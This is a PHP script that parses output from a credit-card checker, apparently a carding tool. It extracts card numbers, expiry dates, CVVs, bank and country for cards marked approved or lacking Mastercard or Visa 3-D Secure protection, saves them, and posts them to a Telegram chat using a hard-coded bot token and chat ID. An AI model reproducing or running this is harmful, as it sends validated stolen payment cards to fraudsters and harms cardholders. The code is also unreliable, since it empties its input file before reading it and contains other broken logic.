<?php
echo"01";
//Oculta erros
ini_set('display_errors', 0 );
error_reporting(0);

include "bin.php";

//So the bot doesnt stop.
set_time_limit(0);
ini_set('display_errors', 'on');

function telegram1($msg) {
        global $telegrambot,$telegramchatid1;
        $url='https://api.telegram.org/bot'.$telegrambot.'/sendMessage';$data=array('chat_id'=>$telegramchatid1,'text'=>$msg);
        $options=array('http'=>array('method'=>'POST','header'=>"Content-Type:application/x-www-form-urlencoded\r\n",'content'=>http_build_query($data),),);
        $context=stream_context_create($options);
        $result=file_get_contents($url,false,$context);
        return $result;
}

// Set your Bot ID and Chat ID.
$telegrambot='922026890:AAECDVox1M8TCMZJJXwDRVHk7PagKJQJ8Os';
//$telegramchatid1='@pirate_flags';
$telegramchatid1='864397332';

//////////////////////////////////////////////////////////////////////////////////////////
function multiexplode ($delimiters,$string) {

    $ready = str_replace($delimiters, $delimiters[0], $string);
    $launch = explode($delimiters[0], $ready);
    return  $launch;
}

//////////////////////////////////////////////////////////////////////////////////////////

function envia(){
    //abro o arquivo para leitura
    $arquivo1 = fopen("source.txt", "r");

    //inicio uma variavel para levar a conta das linhas e dos caracteres
    $num_linhas = 0;
    $caracteres = 0;

    //faco um loop para percorrer o arquivo linha a linha ate o final do arquivo
    while (!feof ($arquivo1)) {
        //se extraio uma linha do arquivo e nao eh false
        if ($linha = fgets($arquivo1)){
           //acumulo o número de caracteres desta linha
           $caracteres += strlen($linha);
    }
}

fclose ($arquivo1);

////////////////////////////////////////////////////////////////////////////////////////////

function apaga($txt){
  $arquivo3 = fopen($txt, 'w');
  fclose($arquivo3);
}

////////////////////////////////////////////////////////////////////////////////////////////

apaga("tratado.txt");
apaga("chk_arquivo.txt");
apaga("source.txt");

if($caracteres > 0){
    //echo "Tem informações dentro do text\n \n";
    $arquivo2 = fopen ("source.txt", "r");
    while(!feof($arquivo2))
        {
            //Mostra uma linha do arquivo
            $linha = fgets($arquivo2, 512);
            $dados = multiexplode(array(": ", "Link"),$linha);
            $ccs = multiexplode(array("#brazil bot checker","Informações: "," | "," » ","#brazil bot checker","7[","DEBITOU: "),$linha);
            $msc = multiexplode(array("#brazil bot checker","Informações: "," | "," » ","#brazil bot checker","7[","DEBITOU: "),$linha);
            $vbv = multiexplode(array("#brazil bot checker","Informações: "," | "," » ","#brazil bot checker","7[","DEBITOU: "),$linha);

            //echo($dados[0]);
            if($dados[0]=="RESULTADO DA CONSULTA"){
                telegram1('✔️ '.$dados[0].'
📝 '.$dados[1]." ".$dados[2].'
🛰️ '.'Link : '.$dados[3].$dados[4]);
            }

            if($ccs[0]=="APROVADA ✔"){
              $name = 'tratado.txt';
              $file = fopen($name, 'a');
              //echo($ccs[1]);
              fwrite($file, $ccs[0]);
              fwrite($file, '
💳Cartão -> ');
              fwrite($file, $ccs[1]);
              fwrite($file, '
💳Mês -> ');
              fwrite($file, $ccs[2]);
              fwrite($file, '
💳Ano -> 20');
              fwrite($file, $ccs[3]);
              fwrite($file, '
💳CVV -> ');
              fwrite($file, $ccs[4]);
//cc($ccs[1]);

              $chk_arq = 'chk_arquivo.txt';
              $file = fopen($chk_arq, 'a');
              //echo($ccs[1]);
              /*fwrite($file, $ccs[0]);
              fwrite($file, ' ');*/
              fwrite($file, $ccs[1]);
              fwrite($file, '|');
              fwrite($file, $ccs[2]);
              fwrite($file, '|20');
              fwrite($file, $ccs[3]);
              fwrite($file, '|');
              fwrite($file, $ccs[4]);
              fwrite($file, '
');
              fclose($chk_arq);

              telegram1($ccs[0].'
💳Cartão -> '.$ccs[1].'
💳Mês -> '.$ccs[2].'
💳Ano -> 20'.$ccs[3].'
💳CVV -> '.$ccs[4]);
//cc($ccs[1]));
            }

            if($msc[0]=="SEM MSC ✔"){
                telegram1('
💳Cartão -> '.$msc[1].'
💳Mês -> '.$msc[2].'
💳Ano -> 20'.$msc[3].'
💳CVV -> '.$msc[4].'
🏦Banco -> '.$msc[9].'
💫Tipo -> '.$msc[10].'
🔎Nivel -> '.$msc[11].'
🏴󠁵󠁳󠁴󠁸󠁿Pais -> '.$msc[12]);
            }

        if($vbv[0]=="SEM VBV ✔"){
                telegram1($vbv[0].'
💳Cartão -> '.$vbv[1].'
💳Mês -> '.$vbv[2].'
💳Ano -> 20'.$vbv[3].'
💳CVV -> '.$vbv[4].'
🏦Banco -> '.$vbv[9].'
💫Tipo -> '.$vbv[10].'
🔎Nivel -> '.$vbv[11].'
🏴󠁵󠁳󠁴󠁸󠁿Pais -> '.$vbv[12]);
            }
        }
}
fclose($arquivo2);
}

envia();
?>
